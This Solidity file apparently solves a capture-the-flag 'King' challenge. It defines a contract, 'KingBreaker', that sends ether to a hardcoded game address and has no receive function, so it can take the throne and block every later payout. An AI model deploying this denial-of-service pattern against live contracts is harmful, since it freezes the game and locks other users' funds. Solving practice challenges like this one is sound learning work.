// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.7.0 <0.9.0;

contract KingBreaker {
    address payable kingAddress = payable(0x51B38c9b761f89a09683567Bb7512B693c558110);
    
    function kingTransfer () external payable {
        kingAddress.transfer( msg.value);
    }
}